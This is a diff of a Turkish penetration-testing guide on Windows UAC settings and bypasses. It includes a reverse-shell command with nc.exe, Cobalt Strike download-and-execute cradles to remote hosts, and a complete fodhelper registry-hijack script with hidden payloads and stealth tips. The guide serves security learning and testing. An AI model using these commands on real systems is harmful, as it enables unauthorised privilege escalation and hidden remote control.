@@ -1,49 +1,49 @@
-# UAC - Kullanıcı Hesabı Kontrolü
+# UAC - Kullanıcı Hesap Denetimi
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## UAC
 
-[Kullanıcı Hesabı Kontrolü (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş aktiviteler için onay istemi** sağlayan bir özelliktir. Uygulamalar farklı `integrity` seviyelerine sahiptir ve **yüksek seviyeye** sahip bir program, **sistemi potansiyel olarak tehlikeye atabilecek** görevleri yerine getirebilir. UAC etkinleştirildiğinde, uygulamalar ve görevler her zaman **bir yönetici hesabının güvenlik bağlamında çalışır**; yönetici, bu uygulamaların/görevlerin sisteme yönetici düzeyinde erişim izni vermediği sürece. Bu, yöneticileri istenmeyen değişikliklerden koruyan bir kolaylık özelliğidir, ancak bir güvenlik sınırı olarak kabul edilmez.
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bir uygulamadır ve **yükseltilmiş işlemler için onay istemi** sağlar. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviye** bir program sisteme **potansiyel olarak zarar verebilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda, bir yönetici açıkça bu uygulama/görevlere yönetici düzeyinde erişim yetkisi vermedikçe uygulamalar ve görevler her zaman **bir yönetici olmayan hesabın güvenlik bağlamı altında** çalışır. Bu, yöneticileri istem dışı değişikliklerden koruyan bir kolaylık özelliğidir ancak bir güvenlik sınırı olarak kabul edilmez.
 
-Integrity seviyeleri hakkında daha fazla bilgi için:
+Daha fazla bilgi için integrity seviyeleri hakkında:
 
 {{#ref}}
 ../windows-local-privilege-escalation/integrity-levels.md
 {{#endref}}
 
-UAC uygulandığında, bir yönetici kullanıcıya 2 jeton verilir: standart kullanıcı anahtarı, normal seviyede düzenli işlemler gerçekleştirmek için ve yönetici ayrıcalıkları olan bir jeton.
+UAC etkin olduğunda, bir yönetici kullanıcıya 2 token verilir: normal işlemler için standart bir kullanıcı token'ı ve yönetici ayrıcalıkları içeren bir token.
 
-Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), UAC'nin nasıl çalıştığını derinlemesine tartışmakta ve oturum açma süreci, kullanıcı deneyimi ve UAC mimarisini içermektedir. Yöneticiler, UAC'nin kendi organizasyonlarına özgü nasıl çalıştığını yerel düzeyde (secpol.msc kullanarak) veya bir Active Directory alan ortamında Grup İlkesi Nesneleri (GPO) aracılığıyla yapılandırıp dağıtmak için güvenlik politikalarını kullanabilirler. Çeşitli ayarlar detaylı olarak [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) tartışılmaktadır. UAC için ayarlanabilecek 10 Grup İlkesi ayarı vardır. Aşağıdaki tablo ek detaylar sağlamaktadır:
+Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC'nin nasıl çalıştığını derinlemesine tartışır ve oturum açma süreci, kullanıcı deneyimi ve UAC mimarisini içerir. Yöneticiler, UAC'nin kuruluşlarına özel nasıl çalışacağını yerel düzeyde güvenlik ilkeleriyle (secpol.msc kullanarak) yapılandırabilir veya Active Directory alan ortamında Group Policy Objects (GPO) aracılığıyla dağıtabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak tartışılmaktadır. UAC için ayarlanabilecek 10 Grup İlkesi ayarı vardır. Aşağıdaki tablo ek ayrıntı sağlar:
 
-| Grup İlkesi Ayarı                                                                                                                                                                                                                                                                                                                                                           | Kayıt Anahtarı              | Varsayılan Ayar                                              |
+| Grup İlkesi Ayarı                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Varsayılan Ayar                                              |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
-| [Kullanıcı Hesabı Kontrolü: Yerleşik Yönetici hesabı için Yönetici Onay Modu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Devre Dışı                                                  |
-| [Kullanıcı Hesabı Kontrolü: UIAccess uygulamalarının güvenli masaüstünü kullanmadan yükseltme istemesi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Devre Dışı                                                  |
-| [Kullanıcı Hesabı Kontrolü: Yönetici Onay Modu'ndaki yöneticiler için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Windows dışı ikili dosyalar için onay istemi               |
-| [Kullanıcı Hesabı Kontrolü: Standart kullanıcılar için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Güvenli masaüstünde kimlik bilgileri isteme                 |
-| [Kullanıcı Hesabı Kontrolü: Uygulama kurulumlarını tespit et ve yükseltme istemesi](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Etkin (ev için varsayılan) Devre Dışı (kurumsal için varsayılan) |
-| [Kullanıcı Hesabı Kontrolü: Sadece imzalanmış ve doğrulanmış yürütülebilir dosyaları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Devre Dışı                                                  |
-| [Kullanıcı Hesabı Kontrolü: Sadece güvenli konumlarda kurulu UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Etkin                                                      |
-| [Kullanıcı Hesabı Kontrolü: Tüm yöneticileri Yönetici Onay Modu'nda çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Etkin                                                      |
-| [Kullanıcı Hesabı Kontrolü: Yükseltme istemesi sırasında güvenli masaüstüne geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Etkin                                                      |
-| [Kullanıcı Hesabı Kontrolü: Dosya ve kayıt defteri yazma hatalarını kullanıcıya özel konumlara sanallaştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Etkin                                                      |
+| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Devre Dışı                                                   |
+| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Devre Dışı                                                   |
+| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Windows dışı ikili dosyalar için onay istenir               |
+| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Güvenli masaüstünde kimlik bilgileri istenir                 |
+| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Etkin (ev için varsayılan) / Devre Dışı (kurumsal için varsayılan) |
+| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Devre Dışı                                                   |
+| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Etkin                                                        |
+| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Etkin                                                        |
+| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Etkin                                                        |
+| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Etkin                                                        |
 
-### UAC Atlatma Teorisi
+### UAC Bypass Teorisi
 
-Bazı programlar, **kullanıcı yönetici grubuna ait olduğunda** **otomatik olarak yükseltilir**. Bu ikili dosyaların içinde _**Manifests**_ kısmında _**autoElevate**_ seçeneği _**True**_ değeri ile bulunur. İkili dosya ayrıca **Microsoft tarafından imzalanmış** olmalıdır.
+Bazı programlar, kullanıcı **administrator grubuna aitse** **otomatik olarak yükseltilir (autoelevated)**. Bu ikili dosyaların içindeki _**Manifests**_ bölümünde _**autoElevate**_ seçeneği _**True**_ olarak ayarlanmıştır. İkili dosyanın ayrıca **Microsoft tarafından imzalanmış** olması gerekir.
 
-Birçok otomatik yükseltme süreci, **orta düzeyde (normal kullanıcı düzeyinde ayrıcalıklar) çalışan** süreçlerden çağrılabilen **COM nesneleri veya RPC sunucuları** aracılığıyla **işlevsellik** sunar. COM (Bileşen Nesne Modeli) ve RPC (Uzak Prosedür Çağrısı), Windows programlarının farklı süreçler arasında iletişim kurmak ve işlevleri yürütmek için kullandığı yöntemlerdir. Örneğin, **`IFileOperation COM nesnesi`**, dosya işlemlerini (kopyalama, silme, taşıma) yönetmek için tasarlanmıştır ve bir istem olmadan ayrıcalıkları otomatik olarak yükseltebilir.
+Birçok auto-elevate süreci, medium integrity (normal kullanıcı düzeyi ayrıcalıklarıyla çalışan) süreçlerden çağrılabilen **COM objeleri veya RPC sunucuları aracılığıyla işlevsellik** sunar. COM (Component Object Model) ve RPC (Remote Procedure Call), Windows programlarının farklı süreçler arasında iletişim kurup fonksiyonları çalıştırmak için kullandığı yöntemlerdir. Örneğin, **`IFileOperation COM object`** dosya işlemlerini (kopyalama, silme, taşıma) ele almak üzere tasarlanmıştır ve uyarı göstermeden otomatik olarak ayrıcalıkları yükseltebilir.
 
-Bazı kontrollerin yapılabileceğini unutmayın, örneğin sürecin **System32 dizininden çalıştırılıp çalıştırılmadığını kontrol etme**, bu kontrol, örneğin **explorer.exe** veya başka bir System32 konumundaki yürütülebilir dosyaya enjekte edilerek atlatılabilir.
+Bazı kontrollerin, örneğin işlemin **System32 dizininden** çalıştırılıp çalıştırılmadığını kontrol etmesi gibi kontroller yapılabileceğini unutmayın; bu tür kontroller, örneğin **explorer.exe'ye enjeksiyon** yapmak veya System32 konumunda bulunan başka bir yürütülebilir dosyaya enjeksiyonla atlatılabilir.
 
-Bu kontrolleri atlatmanın bir diğer yolu, **PEB'yi değiştirmektir**. Windows'taki her süreç, yürütülebilir yol gibi süreç hakkında önemli verileri içeren bir Süreç Ortam Bloğu (PEB) içerir. PEB'yi değiştirerek, saldırganlar kendi kötü niyetli süreçlerinin konumunu sahte (spoof) gösterebilir, böylece güvenilir bir dizinden (örneğin system32) çalışıyormuş gibi görünmesini sağlar. Bu sahte bilgi, COM nesnesini kullanıcıdan onay istemeden ayrıcalıkları otomatik olarak yükseltmeye kandırır.
+Bu kontrolleri atlatmanın bir diğer yolu PEB'i **değiştirmektir**. Windows'taki her sürecin bir Process Environment Block (PEB) vardır; bu blok süreç hakkında yürütülebilir yol gibi önemli verileri içerir. PEB'i değiştirerek, saldırganlar kendi kötü amaçlı süreçlerinin konumunu sahte (spoof) şekilde gösterebilir ve sürecin güvenilir bir dizinden (ör. system32) çalışıyormuş gibi görünmesini sağlayabilir. Bu taklit edilmiş bilgi, COM objesini kullanıcıya sormadan otomatik olarak ayrıcalıkları yükseltmek için kandırır.
 
-Sonra, **UAC'yi atlatmak** (orta düzeyden **yüksek** düzeye yükseltmek) için bazı saldırganlar bu tür ikili dosyaları **rastgele kod çalıştırmak** için kullanır çünkü bu, **Yüksek düzeyde bir süreçten** çalıştırılacaktır.
+Daha sonra, UAC'yi **atlatmak (yani medium integrity seviyesinden high'a yükselmek)** için bazı saldırganlar bu tür ikilileri kullanarak **rastgele kod çalıştırır**, çünkü kod **High integrity** seviyesindeki bir süreçten çalıştırılacaktır.
 
-Bir ikilinin _**Manifest**_ dosyasını _**sigcheck.exe**_ aracını kullanarak kontrol edebilirsiniz. (`sigcheck.exe -m <file>`) Ve süreçlerin **integrity level**'ını _Process Explorer_ veya _Process Monitor_ (Sysinternals) kullanarak **görebilirsiniz**.
+Bir ikilinin _**Manifest**_'ini kontrol etmek için Sysinternals'tan _**sigcheck.exe**_ aracını kullanabilirsiniz. (`sigcheck.exe -m <file>`) Ve süreçlerin **integrity seviyesini** görmek için _Process Explorer_ veya _Process Monitor_ (Sysinternals) kullanabilirsiniz.
 
-### UAC'yi Kontrol Et
+### UAC Kontrolü
 
 UAC'nin etkin olup olmadığını doğrulamak için:
 ```
@@ -52,70 +52,70 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Eğer **`1`** ise UAC **etkin**, eğer **`0`** ise veya **mevcut değilse**, UAC **etkisiz**dir.
+Eğer **`1`** ise UAC **etkinleştirilmiş**, eğer **`0`** ise veya mevcut değilse UAC **devre dışı**.
 
-Sonra, **hangi seviye** yapılandırıldığını kontrol edin:
+Sonra, **hangi seviyenin** yapılandırıldığını kontrol edin:
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
-- Eğer **`0`** ise, UAC istemi olmayacak (gibi **devre dışı**)
-- Eğer **`1`** ise, admin **kullanıcı adı ve şifre** istenir yüksek haklarla ikili dosyayı çalıştırmak için (Güvenli Masaüstünde)
-- Eğer **`2`** ise (**Her zaman beni bilgilendir**) UAC, admin yüksek ayrıcalıklarla bir şey çalıştırmaya çalıştığında her zaman onay isteyecektir (Güvenli Masaüstünde)
-- Eğer **`3`** ise `1` gibi ama Güvenli Masaüstünde gerekli değil
-- Eğer **`4`** ise `2` gibi ama Güvenli Masaüstünde gerekli değil
-- Eğer **`5`** ise (**varsayılan**) adminin yüksek ayrıcalıklarla Windows dışı ikili dosyaları çalıştırmak için onay vermesi istenecektir
+- Eğer **`0`** ise, UAC uyarısı gelmez (yani **devre dışı**)
+- Eğer **`1`** ise yöneticiye yüksek haklarla binary'yi çalıştırmak için **kullanıcı adı ve parola sorulur** (Secure Desktop üzerinde)
+- Eğer **`2`** (**Always notify me**) yönetici yüksek ayrıcalıkla bir şey çalıştırmayı denediğinde UAC her zaman onay ister (Secure Desktop üzerinde)
+- Eğer **`3`** `1` gibidir ama Secure Desktop gerekli değildir
+- Eğer **`4`** `2` gibidir ama Secure Desktop gerekli değildir
+- Eğer **`5`** (**varsayılan**) Windows olmayan binary'leri yüksek ayrıcalıklarla çalıştırmak için yöneticiden onay ister
 
-Sonra, **`LocalAccountTokenFilterPolicy`** değerine bakmalısınız\
-Eğer değer **`0`** ise, yalnızca **RID 500** kullanıcısı (**yerleşik Yönetici**) **UAC olmadan admin görevleri** gerçekleştirebilir ve eğer `1` ise, **"Yöneticiler"** grubundaki tüm hesaplar bunları yapabilir.
+Sonra, **`LocalAccountTokenFilterPolicy`** değerine bakmalısınız.\
+Eğer değer **`0`** ise, yalnızca **RID 500** kullanıcısı (yerleşik Yönetici) **UAC olmadan yönetici görevlerini** yerine getirebilir; eğer **`1`** ise, **"Administrators"** grubundaki tüm hesaplar bunu yapabilir.
 
-Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakmalısınız\
-Eğer **`0`** (varsayılan), **yerleşik Yönetici hesabı** uzaktan yönetim görevlerini yapabilir ve eğer **`1`** ise yerleşik Yönetici hesabı uzaktan yönetim görevlerini **yapamaz**, `LocalAccountTokenFilterPolicy` `1` olarak ayarlanmadıkça.
+Ve son olarak **`FilterAdministratorToken`** anahtarının değerine bakın.\
+Eğer **`0`** (varsayılan) ise, yerleşik Administrator hesabı uzak yönetim görevlerini yapabilir; eğer **`1`** ise yerleşik Administrator hesabı uzak yönetim görevlerini yapamaz, ancak `LocalAccountTokenFilterPolicy` `1` olarak ayarlanmışsa yapabilir.
 
-#### Özet
+#### Summary
 
-- Eğer `EnableLUA=0` veya **mevcut değilse**, **hiç kimse için UAC yok**
-- Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=1`**, hiç kimse için UAC yok
-- Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=0`, RID 500 için UAC yok (Yerleşik Yönetici)**
-- Eğer `EnableLua=1` ve **`LocalAccountTokenFilterPolicy=0` ve `FilterAdministratorToken=1`, herkes için UAC var**
+- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
+- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
+- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (yerleşik Yönetici)**
+- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**
 
-Tüm bu bilgiler **metasploit** modülü kullanılarak toplanabilir: `post/windows/gather/win_privs`
+Tüm bu bilgiler **metasploit** modülü ile toplanabilir: `post/windows/gather/win_privs`
 
-Kullanıcınızın gruplarını kontrol edebilir ve bütünlük seviyesini alabilirsiniz:
+Ayrıca kullanıcı gruplarınızı kontrol edebilir ve integrity level'ınızı öğrenebilirsiniz:
 ```
 net user %username%
 whoami /groups | findstr Level
 ```
-## UAC atlatma
+## UAC bypass
 
 > [!TIP]
-> Kurbanın grafik erişimine sahipseniz, UAC atlatmanın oldukça basit olduğunu unutmayın; UAC istemi göründüğünde "Evet"e tıklamanız yeterlidir.
+> Hedefin grafiksel arayüzüne erişiminiz varsa, UAC bypass çok basittir; UAC istemi göründüğünde sadece "Yes"e tıklayabilirsiniz
 
-UAC atlatma, aşağıdaki durumda gereklidir: **UAC etkin, işleminiz orta bütünlük bağlamında çalışıyor ve kullanıcınız yöneticiler grubuna ait.**
+UAC bypass şu durumda gereklidir: **UAC etkin, işleminiz medium integrity context içinde çalışıyor ve kullanıcı hesabınız administrators grubuna ait**.
 
-UAC'nın **en yüksek güvenlik seviyesinde (Her Zaman) atlatılmasının, diğer seviyelerden (Varsayılan) çok daha zor olduğunu** belirtmek önemlidir.
+Belirtmek gerekir ki, **UAC en yüksek güvenlik seviyesindeyse (Always), diğer herhangi bir seviyedeyken (Default) olduğuna kıyasla atlatmak çok daha zordur.**
 
 ### UAC devre dışı
 
-Eğer UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**) **yönetici ayrıcalıklarıyla bir ters shell çalıştırabilirsiniz** (yüksek bütünlük seviyesi) gibi bir şey kullanarak:
+Eğer UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**) şu gibi bir şey kullanarak (high integrity level) **admin privileges ile bir reverse shell çalıştırabilirsiniz:**
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-#### UAC atlatma ile token kopyalama
+#### UAC bypass with token duplication
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Çok** Temel UAC "atlatma" (tam dosya sistemi erişimi)
+### **Çok Temel** UAC "bypass" (full file system access)
 
-Eğer Administrators grubunda bir kullanıcı ile bir shell'e sahipseniz, **C$** paylaşımını SMB (dosya sistemi) üzerinden yeni bir diske yerel olarak **monte edebilir ve dosya sisteminin içindeki her şeye erişim sağlayabilirsiniz** (hatta Administrator ana klasörüne).
+Eğer Administrators grubunun içinde bir kullanıcıyla shell'e sahipseniz, SMB üzerinden paylaşılan **mount the C$**'ı yerel olarak yeni bir diske bağlayabilir ve file system içindeki her şeye **erişiminiz olur** (hatta Administrator home folder).
 
 > [!WARNING]
-> **Bu numaranın artık çalışmadığı görünüyor**
+> **Görünüşe göre bu hile artık çalışmıyor**
 ```bash
 net use Z: \\127.0.0.1\c$
 cd C$
@@ -123,9 +123,9 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
-### UAC atlatma ile cobalt strike
+### UAC bypass ile cobalt strike
 
-Cobalt Strike teknikleri, UAC maksimum güvenlik seviyesinde ayarlanmamışsa yalnızca çalışacaktır.
+Cobalt Strike teknikleri yalnızca UAC maksimum güvenlik seviyesinde ayarlı değilse çalışır.
 ```bash
 # UAC bypass via token duplication
 elevate uac-token-duplication [listener_name]
@@ -137,18 +137,18 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 # Bypass UAC with CMSTPLUA COM interface
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
-**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için birkaç modül sunmaktadır.
+**Empire** ve **Metasploit** ayrıca **UAC**'yi **bypass** etmek için birkaç modüle sahiptir.
 
 ### KRBUACBypass
 
-Dokümantasyon ve araç [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) adresinde bulunmaktadır.
+Dokümantasyon ve araç: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
-### UAC bypass exploitleri
+### UAC bypass exploits
 
-[**UACME**](https://github.com/hfiref0x/UACME), birkaç UAC bypass exploitinin **derlemesi**dir. **UACME'yi visual studio veya msbuild kullanarak derlemeniz gerektiğini** unutmayın. Derleme, birkaç çalıştırılabilir dosya (örneğin `Source\Akagi\outout\x64\Debug\Akagi.exe`) oluşturacaktır, **hangi dosyaya ihtiyacınız olduğunu bilmeniz gerekecek.**\
-**Dikkatli olmalısınız** çünkü bazı bypasslar, **kullanıcıya** bir şeylerin olduğunu **bildiren** bazı diğer programları **uyarabilir**.
+[**UACME** ](https://github.com/hfiref0x/UACME) birkaç UAC bypass exploits içeren bir **derlemedir**. Dikkat: **UACME'yi visual studio veya msbuild kullanarak derlemeniz gerekecek**. Derleme birkaç çalıştırılabilir dosya oluşturacaktır (ör. `Source\Akagi\outout\x64\Debug\Akagi.exe`), hangi dosyaya **ihtiyaç duyduğunuzu** bilmeniz gerekecek.\
+**Dikkatli olun**, çünkü bazı bypass'lar bazı diğer programları **tetikleyebilir** ve bu programlar **kullanıcıyı** bir şeylerin olduğunu **uyarabilir**.
 
-UACME, her tekniğin çalışmaya başladığı **derleme sürümünü** içermektedir. Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:
+UACME, **her tekniğin hangi build sürümünden itibaren çalışmaya başladığını** gösterir. Sürümlerinizi etkileyen bir teknik arayabilirsiniz:
 ```
 PS C:\> [environment]::OSVersion.Version
 
@@ -158,39 +158,77 @@ Major  Minor  Build  Revision
 ```
 Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.
 
-#### Daha Fazla UAC atlatma
+### UAC Bypass – fodhelper.exe (Registry hijack)
 
-**Burada** AUC'yi atlatmak için kullanılan **tüm** teknikler, kurbanla **tam etkileşimli bir shell** gerektirir (yaygın bir nc.exe shell yeterli değildir).
+Güvenilen ikili `fodhelper.exe` modern Windows sürümlerinde otomatik olarak yükseltilir. Başlatıldığında, `DelegateExecute` verbünü doğrulamadan aşağıdaki kullanıcıya özel kayıt defteri yolunu sorgular. Oraya bir komut yerleştirmek, bir Medium Integrity sürecinin (kullanıcı Administrators grubunda) UAC prompt olmadan bir High Integrity süreci başlatmasına olanak verir.
 
-Bir **meterpreter** oturumu kullanarak elde edebilirsiniz. **Session** değeri **1** olan bir **işleme** geçin:
+Registry path queried by fodhelper:
+```
+HKCU\Software\Classes\ms-settings\Shell\Open\command
+```
+PowerShell adımları (payload'unuzu ayarlayın, sonra trigger edin):
+```powershell
+# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
+C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"
+
+# 1) Create the vulnerable key and values
+New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
+
+# 2) Set default command to your payload (example: reverse shell or cmd)
+# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force
+
+# 3) Trigger auto-elevation
+Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"
+
+# 4) (Recommended) Cleanup
+Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
+```
+Notlar:
+- Mevcut kullanıcı Administrators grubunun bir üyesi olduğunda ve UAC seviyesi varsayılan/esnek olduğunda işe yarar (Always Notify ile ek kısıtlamalar olduğunda çalışmaz).
+- 64-bit Windows'ta 32-bit bir process'ten 64-bit PowerShell başlatmak için `sysnative` yolunu kullanın.
+- Payload herhangi bir komut (PowerShell, cmd veya bir EXE yolu) olabilir. Stealth için uyarı gösteren UI'ları tetiklemekten kaçının.
+
+#### Daha fazla UAC bypass
+
+**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).
+
+You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:
 
 ![](<../../images/image (863).png>)
 
-(_explorer.exe_ çalışmalıdır)
+(_explorer.exe_ should works)
 
-### GUI ile UAC Atlatma
+### GUI ile UAC Bypass
 
-Eğer bir **GUI'ye erişiminiz varsa, UAC istemini aldığınızda sadece kabul edebilirsiniz**, gerçekten bir atlatmaya ihtiyacınız yok. Bu nedenle, bir GUI'ye erişim sağlamak UAC'yi atlatmanıza olanak tanır.
+Eğer bir **GUI** erişiminiz varsa, UAC istemini aldığınızda onu kabul edebilirsiniz; gerçekten bir bypass'a ihtiyacınız yoktur. Bu nedenle, GUI erişimi UAC'yi bypass etmenize izin verir.
 
-Ayrıca, birinin kullandığı (potansiyel olarak RDP aracılığıyla) bir GUI oturumu elde ederseniz, **yönetici olarak çalışan bazı araçlar** olacaktır; buradan örneğin **admin** olarak doğrudan bir **cmd** **çalıştırabilirsiniz** ve UAC tarafından tekrar istemde bulunulmaz, [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **gizli** olabilir.
